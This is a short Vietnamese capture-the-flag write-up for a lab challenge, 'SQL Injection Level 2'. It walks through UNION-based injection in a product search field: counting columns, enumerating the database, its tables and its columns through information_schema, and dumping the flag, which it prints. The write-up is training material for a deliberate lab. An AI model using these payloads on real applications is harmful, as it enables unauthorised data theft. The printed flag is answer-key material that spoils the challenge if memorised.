# Solve **SQL Injection Level 2**

Đối với bài này, lỗi SQL Injection sẽ xuất hiện ở phần Search Product.
Khi bạn nhập các số 1-14 thì trang web sẽ lần lượt trả về các hình ảnh sản phẩm tương ứng với giá trị ID mà bạn nhập.

Tiến hành dò cột để thực hiện lệnh UNION

(Điều kiện để dùng câu lệnh UNION:

- Số lượng cột của các lệnh SELECT phải bằng nhau
- Cùng kiểu dữ liệu.

)
Sử dụng `1 UNION SELECT NULL, NULL` thì dò được số column của câu select là 2.

Tiếp theo, dò tên bảng và tên cột. (Cái này bọn mình sẽ giới thiệu với các bạn sau)

Dò tên của Database:

```sql
1 UNION SELECT NULL, DATABASE()
```

Dò tên bảng:

```sql
1 UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema = 'sql_level2'
```

Dò tên cột:

```sql
1 UNION SELECT NULL, column_name from information_schema.columns where table_schema='sql_level2' and table_name='flags'
```

(Có hint tên bảng là: flags và tên cột là **flag** 😉😉)

Dùng payload: `1 UNION SELECT flag, flag from flags` sẽ lấy được flag.

![Alt text](image.png)

`FLAG: VKU{FLAG_SQL_I_LEVEL_2_YOU 4RA G006}`
